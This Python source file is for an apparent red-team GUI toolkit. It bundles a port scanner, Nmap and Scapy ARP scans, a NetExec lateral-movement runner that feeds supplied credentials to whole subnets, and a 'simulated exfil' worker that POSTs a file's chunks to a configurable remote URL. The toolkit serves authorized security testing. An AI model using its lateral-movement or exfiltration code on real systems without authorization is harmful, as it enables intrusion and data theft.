# Red Raven - by CyberJump (Sharat)
# Licensed under the GNU General Public License v3.0
# https://www.gnu.org/licenses/gpl-3.0.html

import sys
import os
import shutil
import socket
import threading
import ipaddress
import subprocess
import shlex
import time
import http.server
import socketserver
import requests
import tempfile
from datetime import datetime
from queue import Queue, Empty # Import Empty for queue timeout
import importlib.util # For checking module existence

from PyQt6.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout, QGridLayout,
    QLabel, QLineEdit, QPushButton, QTextEdit, QTabWidget, QComboBox,
    QCheckBox, QFileDialog, QFrame, QMessageBox, QProgressBar
)
from PyQt6.QtCore import Qt, QThread, pyqtSignal, QTimer, QObject, QPoint
from PyQt6.QtGui import QFont, QPalette, QColor, QIntValidator, QPixmap, QCursor

# --- Global variables for Exfil Server ---
# These need to be defined before the ExfilHTTPRequestHandler class
SIMULATED_EXFIL_SERVER_PORT = 8080
SIMULATED_EXFIL_RECEIVED_DIR = os.path.join(os.getcwd(), "exfil_received")

# Ensure the directory exists
os.makedirs(SIMULATED_EXFIL_RECEIVED_DIR, exist_ok=True)

class ExfilServerSignals(QObject):
    """
    A QObject to emit signals from the HTTP server thread to the GUI thread.
    """
    update_output = pyqtSignal(str)

# Instantiate the signals object
exfil_server_signals = ExfilServerSignals()

simulated_exfil_server = None
simulated_exfil_server_thread = None # Keep track of the server thread

class ExfilHTTPRequestHandler(http.server.BaseHTTPRequestHandler):
    """
    Custom HTTP request handler for the simulated exfil server.
    """
    def do_POST(self):
        try:
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)

            # Extract filename from headers, or use a default
            filename = self.headers.get('X-Filename', f"received_file_{datetime.now().strftime('%Y%m%d_%H%M%S')}.bin")
            filepath = os.path.join(SIMULATED_EXFIL_RECEIVED_DIR, filename)

            # Append to the file (simulating chunks being received)
            with open(filepath, 'ab') as f:
                f.write(post_data)

            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b"File chunk received successfully!")

            # Emit signal to update GUI
            exfil_server_signals.update_output.emit(f"  [SERVER] Received {len(post_data)} bytes for '{filename}'. Total size: {os.path.getsize(filepath)} bytes.\n")

        except Exception as e:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(f"Error: {e}".encode())
            exfil_server_signals.update_output.emit(f"  [SERVER ERROR] {e}\n")

    def log_message(self, format, *args):
        # Suppress default HTTP server logging to console
        pass


# --- Dependency Installation Logic ---
def check_and_install_dependencies():
    """
    Checks for required Python packages and attempts to install them if missing.
    Returns True if all dependencies are met (either found or successfully installed),
    False otherwise.
    """
    required_packages = {
        "PyQt6": "PyQt6",
        "scapy": "scapy",
        "requests": "requests",
        # ipaddress is typically built-in for Python 3.3+ and doesn't need explicit installation.
    }
    missing_packages = []

    print("Checking for required Python dependencies...")

    for module_name, package_name in required_packages.items():
        if importlib.util.find_spec(module_name) is None:
            missing_packages.append(package_name)

    if missing_packages:
        print(f"The following packages are missing: {', '.join(missing_packages)}")
        print("Attempting to install them using pip...")
        try:
            # It's good practice to upgrade pip first to ensure compatibility
            print("Upgrading pip...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", "--upgrade", "pip"])
            print("pip upgraded successfully.")

            # Install missing packages
            pip_command = [sys.executable, "-m", "pip", "install"] + missing_packages
            print(f"Running command: {' '.join(pip_command)}")
            subprocess.check_call(pip_command)
            print("All missing packages installed successfully.")
            return True # Indicate successful installation
        except subprocess.CalledProcessError as e:
            print(f"Error installing packages: {e}")
            print("Please ensure you have pip installed and proper permissions (e.g., run with sudo on Linux).")
            print(f"You might need to manually install them: pip install {' '.join(missing_packages)}")
            return False # Indicate installation failure
        except Exception as e:
            print(f"An unexpected error occurred during dependency installation: {e}")
            return False
    else:
        print("All required dependencies are already installed.")
        return True # Indicate all dependencies are present

# --- Global variable for Scapy availability ---
# This will be set after the dependency check and potential installation
SCAPY_AVAILABLE = False
# Scapy imports will be attempted after dependency check in __main__

# --- Worker Threads ---

class CommandExecutionWorker(QThread):
    update_output = pyqtSignal(str)
    update_status = pyqtSignal(str)
    command_finished = pyqtSignal()

    def __init__(self, command, authorization_var):
        super().__init__()
        self.command = command
        self.authorization_var = authorization_var
        self._is_running = True
        self._process = None
        self.output_buffer = [] # Buffer for output
        self.buffer_threshold = 20 # Emit after 20 lines

    def _flush_buffer(self):
        if self.output_buffer:
            self.update_output.emit("".join(self.output_buffer))
            self.output_buffer.clear()

    def run(self):
        if not self.authorization_var:
            self.update_output.emit("Authorization required to perform this operation.\n")
            self.update_status.emit("Operation aborted: Authorization missing.")
            self.command_finished.emit()
            return

        self.output_buffer.append(f"--- Executing Command: {' '.join(self.command)} ---\n")
        self.update_status.emit(f"Executing: {' '.join(self.command)}...")
        try:
            # Use shell=False and pass command as list for robustness
            self._process = subprocess.Popen(self.command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, shell=False)
            while self._is_running:
                if self._process.poll() is not None:
                    break
                # Read line by line to stream output
                output_line = self._process.stdout.readline()
                if output_line:
                    self.output_buffer.append(output_line)
                    if len(self.output_buffer) >= self.buffer_threshold:
                        self._flush_buffer()
                time.sleep(0.01) # Small sleep to prevent busy-waiting

            stdout, stderr = self._process.communicate() # Read any remaining output
            if stdout:
                self.output_buffer.append(stdout)
            if stderr:
                self.output_buffer.append(f"\n--- Error Output ---\n{stderr}\n")

            self._flush_buffer() # Flush any remaining output
            return_code = self._process.returncode
            self.update_output.emit(f"\n--- Command Finished with Return Code: {return_code} ---\n")
            self.update_status.emit(f"Command finished (code: {return_code}).")

        except FileNotFoundError:
            self._flush_buffer() # Flush before error message
            self.update_output.emit(f"Error: Command not found: {self.command[0]}\nEnsure it's installed and in your system's PATH.\n")
            self.update_status.emit(f"Error: Command not found: {self.command[0]}.")
        except Exception as e:
            self._flush_buffer() # Flush before error message
            self.update_output.emit(f"An error occurred: {e}\n")
            self.update_status.emit(f"Error: {e}")
        finally:
            self.command_finished.emit()
            if self._process:
                self._process.wait() # Ensure process is fully terminated
            self._process = None

    def stop(self):
        self._is_running = False
        if self._process and self._process.poll() is None:
            self._process.terminate()
            try:
                self._process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self._process.kill()

class AdvancedPortScanWorker(QThread):
    update_status = pyqtSignal(str)
    scan_finished = pyqtSignal()
    data_available = pyqtSignal() # New signal to indicate data is in the queue

    TIMEOUT = 0.5 # Socket timeout for connection attempts (from user's code)

    def __init__(self, target_input, port_range_input, threads, authorization_var):
        super().__init__()
        self.target_input = target_input
        self.port_range_input = port_range_input
        self.threads = threads
        self.authorization_var = authorization_var
        self._is_running = True
        self.q = Queue()
        self.hosts_to_scan = []
        self.results_queue = Queue() # Thread-safe queue for results to GUI

    def _grab_banner(self, s):
        """Attempts to grab a banner from the socket."""
        try:
            # Short timeout for banner reception to not block too long
            s.settimeout(0.5)
            banner = s.recv(1024).decode(errors='ignore').strip()
            return banner if banner else "No banner (empty response)"
        except socket.timeout:
            return "No banner (timeout)"
        except Exception as e:
            return f"No banner (error: {e})"

    def _scan_single_port(self, host, port):
        """Attempts to connect to a single port and grab its banner."""
        if not self._is_running:
            return

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(self.TIMEOUT)
        try:
            result = s.connect_ex((host, port))
            if result == 0: # Port is open
                banner_info = "No banner"
                try:
                    # Attempt to send specific requests for common services for better banners
                    if port == 80: # HTTP
                        s.sendall(b'GET / HTTP/1.0\r\nHost: ' + host.encode() + b'\r\n\r\n')
                    elif port == 443: # HTTPS (just try to connect, banner grab might fail without SSL handshake)
                        pass # No specific request, just try to read
                    elif port == 21: # FTP
                        pass # FTP server usually sends banner on connect
                    elif port == 22: # SSH
                        pass # SSH server usually sends banner on connect
                    elif port == 23: # Telnet
                        pass # Telnet server usually sends banner on connect
                    else:
                        # For other ports, just try to read whatever is sent
                        pass

                    banner_data = self._grab_banner(s)
                    if banner_data:
                        banner_info = banner_data.split('\n')[0] # Take first line of banner
                    else:
                        banner_info = "No banner received"

                except Exception as e:
                    banner_info = f"Banner grab error: {e}"

                self.results_queue.put(f"[OPEN] {host}:{port:<5} | {banner_info}")
                self.data_available.emit() # Emit signal to indicate new data
            # Added a small sleep here to pace the scanning, regardless of result
            time.sleep(0.001) # Small sleep to prevent busy-waiting and reduce CPU churn
        except (socket.timeout, ConnectionRefusedError):
            time.sleep(0.001) # Also sleep on common errors
            pass # Port is closed or filtered, no output needed for these
        except Exception as e:
            # Catch any other unexpected errors during socket creation or connection
            self.results_queue.put(f"Error scanning {host}:{port}: {e}") # Add errors to queue too
            self.data_available.emit() # Emit signal to indicate new data
            time.sleep(0.001) # Also sleep on other errors
        finally:
            s.close()

    def threader(self):
        """Worker function for each thread to process (host, port) tuples from the queue."""
        while self._is_running:
            try:
                host, port = self.q.get(timeout=0.1) # Get task with a timeout

                if not self._is_running: # Check stop flag immediately after getting task
                    self.q.task_done()
                    break

                self._scan_single_port(host, port)
                self.q.task_done()
            except Empty: # Use Empty from queue module
                if not self._is_running:
                    break
                time.sleep(0.05) # Small sleep to prevent busy-waiting
            except Exception as e:
                self.results_queue.put(f"Internal threader error: {e}\n") # Add errors to queue
                self.data_available.emit() # Emit signal to indicate new data
                try:
                    self.q.task_done()
                except ValueError:
                    pass

    def run(self):
        if not self.authorization_var:
            self.results_queue.put("Authorization required to perform scan.\n")
            self.update_status.emit("Scan aborted: Authorization missing.")
            self.scan_finished.emit()
            self.data_available.emit() # Ensure signal is emitted for the error message
            return

        self.results_queue.put("=" * 50 + "\n")
        self.results_queue.put("PORT SCANNER\n")
        self.results_queue.put("=" * 50 + "\n")
        self.data_available.emit()

        # Parse target input (IP, hostname, or CIDR)
        try:
            network = ipaddress.ip_network(self.target_input, strict=False)
            if network.prefixlen < 32:
                self.hosts_to_scan = [str(ip) for ip in network.hosts()]
            else:
                self.hosts_to_scan = [str(network.network_address)]
        except ValueError:
            try:
                self.hosts_to_scan = [socket.gethostbyname(self.target_input)]
            except socket.gaierror:
                self.results_queue.put(f"Error: Hostname '{self.target_input}' could not be resolved.\n")
                self.update_status.emit("Error: Hostname resolution failed.")
                self.scan_finished.emit()
                self.data_available.emit()
                return

        # Parse port range
        try:
            if '-' in self.port_range_input:
                start_port, end_port = map(int, self.port_range_input.split('-'))
            else:
                start_port = end_port = int(self.port_range_input)

            if not (1 <= start_port <= 65535 and 1 <= end_port <= 65535 and start_port <= end_port):
                self.results_queue.put("Error: Invalid port range. Ports must be between 1 and 65535.\n")
                self.update_status.emit("Error: Invalid port range.")
                self.scan_finished.emit()
                self.data_available.emit()
                return
        except ValueError:
            self.results_queue.put("Error: Invalid port range format. Use '1-1000' or '80'.\n")
            self.update_status.emit("Error: Invalid port range format.")
            self.scan_finished.emit()
            self.data_available.emit()
            return

        self.results_queue.put(f"[+] Target: {self.target_input} (Resolved to {len(self.hosts_to_scan)} host(s))")
        self.results_queue.put(f"[+] Port Range: {start_port}-{end_port}")
        self.results_queue.put(f"[+] Threads: {self.threads}")
        self.results_queue.put(f"[+] Scanning started at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        self.results_queue.put("=" * 50 + "\n\n")
        self.data_available.emit()
        self.update_status.emit("Scanning...")

        # Start threads
        threads_list = []
        for _ in range(self.threads):
            t = threading.Thread(target=self.threader, daemon=True)
            threads_list.append(t)
            t.start()

        # Populate queue with (host, port) tuples
        for host in self.hosts_to_scan:
            self.results_queue.put(f"\n--- Scanning Host: {host} ---\n")
            self.data_available.emit()
            self.update_status.emit(f"Scanning {host}...")
            for port in range(start_port, end_port + 1):
                if not self._is_running:
                    break
                self.q.put((host, port))
            if not self._is_running:
                break

        self.q.join() # Wait for all tasks to be done

        # Ensure all worker threads have finished their current tasks
        for t in threads_list:
            t.join(timeout=1) # Give a small timeout for threads to finish gracefully

        if self._is_running:
            self.results_queue.put("\n--- Port Scan Completed ---\n")
            self.update_status.emit("Scan completed.")
        else:
            self.results_queue.put("\n--- Port Scan Stopped by User ---\n")
            self.update_status.emit("Scan stopped.")
        self.data_available.emit() # Final emit to ensure all results are pulled

        self.scan_finished.emit()

    def stop(self):
        """Gracefully stops the scanner by setting a flag."""
        self._is_running = False
        # Clear the queue to unblock any waiting threads quickly
        while not self.q.empty():
            try:
                self.q.get_nowait()
                self.q.task_done()
            except Empty:
                break


class NmapScanWorker(QThread):
    update_results = pyqtSignal(str)
    update_status = pyqtSignal(str)
    scan_finished = pyqtSignal()

    def __init__(self, target_input, port_range_input, authorization_var):
        super().__init__()
        self.target_input = target_input
        self.port_range_input = port_range_input
        self.authorization_var = authorization_var
        self._is_running = True
        self._process = None
        self.output_buffer = [] # Buffer for output
        self.buffer_threshold = 20 # Emit after 20 lines

    def _flush_buffer(self):
        if self.output_buffer:
            self.update_results.emit("".join(self.output_buffer))
            self.output_buffer.clear()

    def run(self):
        if not self.authorization_var:
            self.update_results.emit("Authorization required to perform scan.\n")
            self.update_status.emit("Scan aborted: Authorization missing.")
            self.scan_finished.emit()
            return

        command = ["nmap", self.target_input, "-p", self.port_range_input]
        self.output_buffer.append(f"--- Starting Nmap Port Scan ---\nCommand: {' '.join(command)}\n")
        self.update_status.emit("Scanning with Nmap...")
        try:
            # Use shell=False and pass command as list for robustness
            self._process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, shell=False)
            while self._is_running:
                if self._process.poll() is not None:
                    break
                output_line = self._process.stdout.readline()
                if output_line:
                    self.output_buffer.append(output_line)
                    if len(self.output_buffer) >= self.buffer_threshold:
                        self._flush_buffer()
                time.sleep(0.01)

            stdout, stderr = self._process.communicate()
            if stdout:
                self.output_buffer.append(stdout)
            if stderr:
                self.output_buffer.append(f"\n--- Nmap Error Output ---\n{stderr}\n")

            self._flush_buffer() # Flush any remaining output
            self.update_status.emit("Nmap scan finished.")

        except FileNotFoundError:
            self._flush_buffer() # Flush before error message
            self.update_results.emit("Error: Nmap command not found.\nEnsure Nmap is installed and in your system's PATH.\n")
            self.update_status.emit("Error: Nmap not found.")
        except Exception as e:
            self._flush_buffer() # Flush before error message
            self.update_results.emit(f"An error occurred during Nmap scan: {e}\n")
            self.update_status.emit(f"Error: {e}")
        finally:
            self.scan_finished.emit()
            if self._process:
                self._process.wait()
            self._process = None

    def stop(self):
        self._is_running = False
        if self._process and self._process.poll() is None:
            self._process.terminate()
            try:
                self._process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self._process.kill()

class ScapyNetworkScanWorker(QThread):
    update_results = pyqtSignal(str)
    update_status = pyqtSignal(str)
    scan_finished = pyqtSignal()

    def __init__(self, target_ip, pcap_filename, authorization_var):
        super().__init__()
        self.target_ip = target_ip
        self.pcap_filename = pcap_filename
        self.authorization_var = authorization_var
        self._is_running = True
        self.output_buffer = [] # Buffer for output
        self.buffer_threshold = 10 # Emit after 10 lines

    def _flush_buffer(self):
        if self.output_buffer:
            self.update_results.emit("".join(self.output_buffer))
            self.output_buffer.clear()

    def run(self):
        if not self.authorization_var:
            self.update_results.emit("Authorization required to perform network discovery.\n")
            self.update_status.emit("Network discovery aborted: Authorization missing.")
            self.scan_finished.emit()
            return

        if not SCAPY_AVAILABLE:
            self.update_results.emit("Error: Scapy is not installed. Cannot perform network discovery.\n")
            self.update_status.emit("Network discovery failed: Scapy not found.")
            self.scan_finished.emit() # Ensure signal is emitted even on early exit
            return

        self.output_buffer.append(f"--- Starting Scapy Network Discovery (ARP Scan) ---\n")
        self.output_buffer.append(f"Target IP/Range: {self.target_ip}\n")
        if self.pcap_filename:
            self.output_buffer.append(f"Captured packets will be saved to: {self.pcap_filename}\n")
        self.output_buffer.append("This may take a moment...\n\n")
        self._flush_buffer() # Flush initial messages
        self.update_status.emit("Performing network discovery...")

        try:
            # ARP packet
            from scapy.all import ARP, Ether, srp, wrpcap # Import here to ensure SCAPY_AVAILABLE check is done
            arp = ARP(pdst=self.target_ip)
            ether = Ether(dst="ff:ff:ff:ff:ff:ff") # Broadcast MAC
            packet = ether / arp

            # Perform ARP request
            # timeout=5: wait 5 seconds for responses
            # verbose=0: suppress Scapy's default output
            # [0]: get the answered packets (sent, received)
            answered_packets, unanswered_packets = srp(packet, timeout=5, verbose=0)

            clients = []
            captured_packets = []

            self.output_buffer.append("Available devices on the network:\n")
            self.output_buffer.append("{:<18} {:<18}\n".format("IP Address", "MAC Address"))
            self.output_buffer.append("-" * 37 + "\n")
            self._flush_buffer() # Flush header

            for sent, received in answered_packets:
                if not self._is_running:
                    break
                ip = received.psrc
                mac = received.hwsrc
                clients.append({"ip": ip, "mac": mac})
                self.output_buffer.append(f"{ip:<18} {mac:<18}\n")
                if len(self.output_buffer) >= self.buffer_threshold:
                    self._flush_buffer()
                captured_packets.append(received) # Store the received ARP response

            self._flush_buffer() # Flush any remaining client info

            if not self._is_running:
                self.update_results.emit("\n--- Network Discovery Stopped by User ---\n")
                self.update_status.emit("Network discovery stopped.")
                self.scan_finished.emit()
                return

            if not clients:
                self.update_results.emit("No active devices found in the specified range.\n")

            if self.pcap_filename and captured_packets:
                try:
                    wrpcap(self.pcap_filename, captured_packets)
                    self.update_results.emit(f"\nCaptured packets saved to {self.pcap_filename}\n")
                except Exception as pcap_e:
                    self.update_results.emit(f"\nError saving PCAP file: {pcap_e}\n")

            self.update_results.emit("\n--- Scapy Network Discovery Completed ---\n")
            self.update_status.emit("Network discovery completed.")

        except PermissionError:
            self.update_results.emit("Error: Permission denied. Scapy often requires root/administrator privileges to send/receive raw packets.\nTry running the application with elevated privileges.\n")
            self.update_status.emit("Error: Permission denied for Scapy.")
        except Exception as e:
            self.update_results.emit(f"An unexpected error occurred during network discovery: {e}\n")
            self.update_status.emit(f"Error: {e}")
        finally:
            self.scan_finished.emit()

    def stop(self):
        self._is_running = False


class NetExecWorker(QThread):
    update_output = pyqtSignal(str)
    update_status = pyqtSignal(str)
    netexec_finished = pyqtSignal()

    def __init__(self, full_command_str, target_input_text, authorization_var):
        super().__init__()
        self.full_command_str = full_command_str # This is the user-editable command
        self.target_input_text = target_input_text
        self.authorization_var = authorization_var
        self._is_running = True
        self._process = None
        self.targets = []
        self.output_buffer = [] # Buffer for output
        self.buffer_threshold = 20 # Emit after 20 lines

    def _flush_buffer(self):
        if self.output_buffer:
            self.update_output.emit("".join(self.output_buffer))
            self.output_buffer.clear()

    def run(self):
        if not self.authorization_var:
            self.update_output.emit("Authorization required to perform NetExec operations.\n")
            self.update_status.emit("NetExec aborted: Authorization missing.")
            self.netexec_finished.emit()
            return

        self.output_buffer.append(f"--- Starting Lateral Movement (NetExec) ---\n")
        self.output_buffer.append(f"Base Command: {self.full_command_str}\n")
        self.output_buffer.append(f"Target(s): {self.target_input_text}\n\n")
        self._flush_buffer()
        self.update_status.emit(f"Running NetExec on {self.target_input_text}...")

        try:
            # Parse target input for single IP or CIDR range
            try:
                network = ipaddress.ip_network(self.target_input_text, strict=False)
                if network.prefixlen < 32:
                    self.targets.extend([str(ip) for ip in network.hosts()])
                else:
                    self.targets.append(str(network.network_address))
            except ValueError:
                self.output_buffer.append(f"Error: Invalid target IP or range: {self.target_input_text}\n")
                self._flush_buffer()
                self.update_status.emit("Error: Invalid target.")
                self.netexec_finished.emit()
                return

            total_targets = len(self.targets)
            self.output_buffer.append(f"Found {total_targets} target(s) for NetExec.\n")
            self._flush_buffer()

            for i, target in enumerate(self.targets):
                if not self._is_running:
                    break
                self.output_buffer.append(f"\n--- Executing on Host: {target} ({i+1}/{total_targets}) ---\n")
                self._flush_buffer()
                self.update_status.emit(f"Running NetExec on {target} ({i+1}/{total_targets})...")

                # Parse the user-provided command string
                command_parts = shlex.split(self.full_command_str)
                
                # Replace <target_ip> placeholder or insert target if not present
                final_command_parts = []
                target_inserted = False
                username = None
                password = None
                for part in command_parts:
                    if part == "<target_ip>":
                        final_command_parts.append(target)
                        target_inserted = True
                    # Check for -u and -p flags and capture their values if present
                    elif part.lower() == "-u" and command_parts.index(part) + 1 < len(command_parts):
                        username = command_parts[command_parts.index(part) + 1]
                        final_command_parts.extend([part, username])
                    elif part.lower() == "-p" and command_parts.index(part) + 1 < len(command_parts):
                        password = command_parts[command_parts.index(part) + 1]
                        final_command_parts.extend([part, password])
                    else:
                        final_command_parts.append(part)
                
                # If <target_ip> was not found, try to intelligently insert it
                if not target_inserted:
                    # Heuristic: insert after the tool name and protocol if they exist
                    if len(final_command_parts) >= 2 and \
                       (final_command_parts[0].lower() == "netexec" or final_command_parts[0].lower() == "crackmapexec"):
                        # Check if the second part looks like a protocol
                        known_protocols = ["smb", "ssh", "winrm", "mssql", "ldap", "rdp", "vnc"]
                        if final_command_parts[1].lower() in known_protocols:
                            final_command_parts.insert(2, target) # Insert after tool and protocol
                        else:
                            final_command_parts.insert(1, target) # Insert after tool name
                    else:
                        # Fallback: just append the target if no clear insertion point
                        final_command_parts.append(target)

                # Determine the actual executable name for shutil.which check
                executable_name = final_command_parts[0].lower()

                # Ensure -u and -p are used for username and password if they were found in the command
                # This ensures consistency even if the user didn't explicitly add them in the command string for netexec/cme
                if username and "-u" not in final_command_parts:
                    final_command_parts.extend(["-u", username])
                if password and "-p" not in final_command_parts:
                    final_command_parts.extend(["-p", password])

                final_command_display = " ".join(final_command_parts)
                self.output_buffer.append(f"  Running command: {final_command_display}\n")
                self._flush_buffer()

                try:
                    # Use shell=False and pass command as list for robustness
                    self._process = subprocess.Popen(
                        final_command_parts,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        text=True,
                        bufsize=1,
                        shell=False, # Explicitly set shell to False
                        creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0
                    )
                    while self._is_running:
                        output_line = self._process.stdout.readline()
                        if output_line == '' and self._process.poll() is not None:
                            break
                        if output_line:
                            self.output_buffer.append(f"  {output_line}")
                            if len(self.output_buffer) >= self.buffer_threshold:
                                self._flush_buffer()
                        time.sleep(0.01)

                    remaining_stdout, remaining_stderr = self._process.communicate()
                    if remaining_stdout:
                        self.output_buffer.append(f"  {remaining_stdout}")
                    if remaining_stderr:
                        self.output_buffer.append(f"  Error on {target}:\n  {remaining_stderr}")
                    self._flush_buffer()

                    if self._is_running:
                        return_code = self._process.returncode
                        self.update_output.emit(f"\n  NetExec command finished on {target} with exit code: {return_code}\n")
                    else:
                        self.update_output.emit(f"\n  NetExec command stopped by user on {target}.\n")
                except FileNotFoundError:
                    self._flush_buffer()
                    self.update_output.emit(f"  Error: '{executable_name}' command not found. Please ensure NetExec (or CrackMapExec) is installed and in your system's PATH.\n")
                    self.update_status.emit(f"Error: {executable_name} not found.")
                except Exception as e:
                    self._flush_buffer()
                    self.update_output.emit(f"  An error occurred during NetExec execution on {target}: {e}\n")
                    self.update_status.emit(f"Error: {e}")
                finally:
                    if self._process:
                        self._process.wait()
                    self._process = None

                if not self._is_running:
                    break
                self.update_output.emit("\n" + "="*50 + "\n")

            if self._is_running:
                self.update_status.emit("NetExec finished.")
                self.update_output.emit("\n--- Lateral Movement (NetExec) Completed ---\n")
            else:
                self.update_status.emit("NetExec stopped.")
                self.update_output.emit("\n--- Lateral Movement (NetExec) Stopped by User ---\n")

        except Exception as e:
            self.update_output.emit(f"An unexpected error occurred during NetExec operation: {e}\n")
            self.update_status.emit(f"Error: {e}")
        finally:
            self.netexec_finished.emit()
            if self._process:
                self._process.wait()
            self._process = None

    def stop(self):
        self._is_running = False
        if self._process and self._process.poll() is None:
            self._process.terminate()
            try:
                self._process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self._process.kill()

class DummyFileWorker(QThread):
    update_progress = pyqtSignal(int)
    update_label = pyqtSignal(str)
    update_status = pyqtSignal(str)
    file_created = pyqtSignal(str)
    error_occurred = pyqtSignal(str)

    def __init__(self, file_path, file_size_mb):
        super().__init__()
        self.file_path = file_path
        self.file_size_mb = file_size_mb
        self._is_running = True

    def run(self):
        if os.path.exists(self.file_path):
            pass # We handle overwrite confirmation in the main thread

        self.update_progress.emit(0)
        self.update_label.emit("Creating dummy file...")
        self.update_status.emit("Creating dummy file...")

        try:
            file_size_bytes = self.file_size_mb * 1024 * 1024
            chunk_size = 1024 * 1024

            with open(self.file_path, 'wb') as f:
                bytes_written = 0
                while bytes_written < file_size_bytes and self._is_running:
                    chunk = os.urandom(min(chunk_size, file_size_bytes - bytes_written))
                    f.write(chunk)
                    bytes_written += len(chunk)

                    progress = int((bytes_written / file_size_bytes) * 100)
                    self.update_progress.emit(progress)
                    self.update_label.emit(f"Creating dummy file: {progress:.1f}%")
                    self.update_status.emit(f"Creating dummy file: {progress:.1f}%")
                    time.sleep(0.005) # Small sleep to allow UI updates

            if self._is_running:
                self.update_progress.emit(100)
                self.update_label.emit(f"Dummy file created: {self.file_path}")
                self.update_status.emit("Dummy file created successfully.")
                self.file_created.emit(f"Successfully created dummy file: {self.file_path}\n")
            else:
                # Clean up partially created file if stopped by user
                if os.path.exists(self.file_path):
                    os.remove(self.file_path)
                self.update_label.emit("Dummy file creation stopped.")
                self.update_status.emit("Dummy file creation stopped by user.")
                self.error_occurred.emit("Dummy file creation stopped by user.\n")

        except Exception as e:
            self.update_label.emit(f"Error creating file: {e}")
            self.update_status.emit(f"Error creating dummy file.")
            self.error_occurred.emit(f"Error creating dummy file: {e}\n")

    def stop(self):
        self._is_running = False

class ExfilWorker(QThread):
    update_progress = pyqtSignal(int)
    update_label = pyqtSignal(str)
    update_status = pyqtSignal(str)
    update_output = pyqtSignal(str)
    exfil_finished = pyqtSignal()
    error_occurred = pyqtSignal(str)

    def __init__(self, source_file, local_dest_dir, remote_url, exfil_type):
        super().__init__()
        self.source_file = source_file
        self.local_dest_dir = local_dest_dir
        self.remote_url = remote_url
        self.exfil_type = exfil_type
        self._is_running = True
        self.output_buffer = [] # Buffer for output
        self.buffer_threshold = 10 # Emit after 10 lines

    def _flush_buffer(self):
        if self.output_buffer:
            self.update_output.emit("".join(self.output_buffer))
            self.output_buffer.clear()

    def run(self):
        self.output_buffer.append(f"--- Starting Simulated Exfil ({self.exfil_type}) ---\n")
        self.output_buffer.append(f"Source File: {self.source_file}\n")
        if self.exfil_type in ["Local (Internal)", "Both"]:
            self.output_buffer.append(f"Local Destination: {self.local_dest_dir}\n")
        if self.exfil_type in ["Remote (External)", "Both"]:
            self.output_buffer.append(f"Remote URL: {self.remote_url}\n")
        self.output_buffer.append("\n")
        self._flush_buffer()

        self.update_status.emit("Performing exfil...")
        self.update_progress.emit(0)
        self.update_label.emit("Exfil in progress...")

        try:
            total_size = os.path.getsize(self.source_file)
            chunk_size = 1024 * 1024

            with open(self.source_file, 'rb') as f:
                bytes_written = 0
                while bytes_written < total_size and self._is_running:
                    chunk = f.read(chunk_size)
                    if not chunk:
                        break

                    if self.exfil_type in ["Local (Internal)", "Both"]:
                        dest_file_path_local = os.path.join(self.local_dest_dir, os.path.basename(self.source_file))
                        os.makedirs(os.path.dirname(dest_file_path_local), exist_ok=True)
                        with open(dest_file_path_local, 'ab') as dest_f:
                            dest_f.write(chunk)

                    if self.exfil_type in ["Remote (External)", "Both"]:
                        try:
                            # Pass filename in headers for the server to use
                            headers = {'X-Filename': os.path.basename(self.source_file)}
                            response = requests.post(self.remote_url, data=chunk, headers=headers, timeout=5)
                            if response.status_code != 200:
                                self.output_buffer.append(f"  Error sending chunk: Server responded with {response.status_code}\n")
                                self._flush_buffer()
                                break
                        except requests.exceptions.ConnectionError:
                            self.output_buffer.append("  Error: Could not connect to the simulated exfil server. Is it running?\n")
                            self._flush_buffer()
                            break
                        except requests.exceptions.Timeout:
                            self.output_buffer.append("  Error: Connection to simulated exfil server timed out.\n")
                            self._flush_buffer()
                            break
                        except Exception as req_e:
                            self.output_buffer.append(f"  Error during HTTP request: {req_e}\n")
                            self._flush_buffer()
                            break

                    bytes_written += len(chunk)

                    progress = (bytes_written / total_size) * 100
                    self.update_progress.emit(int(progress))
                    self.update_label.emit(f"Exfil Progress: {progress:.1f}%")
                    self.update_status.emit(f"Exfil Progress: {progress:.1f}%")
                    time.sleep(0.005)

            if not self._is_running:
                self.update_output.emit("\n--- Exfil Stopped by User ---\n")
                self.exfil_finished.emit()
                return

            if self._is_running:
                self.update_progress.emit(100)
                self.update_label.emit(f"Simulated Exfil completed.")
                self.update_status.emit("Simulated Exfil completed successfully.")
                self.update_output.emit(f"\n--- Simulated Exfil Completed Successfully ---\n")
            else:
                self.update_label.emit("Simulated Exfil stopped.")
                self.update_status.emit("Simulated Exfil stopped by user.")
                self.update_output.emit("\n--- Simulated Exfil Operation Stopped by User ---\n")

        except Exception as e:
            self.update_label.emit(f"Simulated Exfil error: {e}")
            self.update_status.emit(f"Simulated Exfil error: {e}")
            self.update_output.emit(f"Error during simulated exfil: {e}\n")
        finally:
            self.exfil_finished.emit()

    def stop(self):
        self._is_running = False

class ExfilServerWorker(QThread):
    server_started = pyqtSignal(str)
    server_stopped = pyqtSignal(str)
    server_error = pyqtSignal(str)

    def __init__(self, port):
        super().__init__()
        self.port = port
        self._server = None

    def run(self):
        global simulated_exfil_server
        try:
            Handler = ExfilHTTPRequestHandler
            # Use ThreadingTCPServer for concurrent requests
            self._server = socketserver.ThreadingTCPServer(("", self.port), Handler)
            simulated_exfil_server = self._server # Store reference to the server instance

            self.server_started.emit(f"Simulated exfil server started at http://127.0.0.1:{self.port}\n")
            # Serve forever in this thread. shutdown() will stop it.
            self._server.serve_forever()
        except Exception as e:
            self.server_error.emit(f"Failed to start exfil server: {e}\n")
        finally:
            self.server_stopped.emit("Simulated exfil server stopped.\n")

    def stop(self):
        if self._server:
            # Shutdown the server gracefully
            self._server.shutdown()
            self._server.server_close()
            global simulated_exfil_server
            simulated_exfil_server = None # Clear global reference

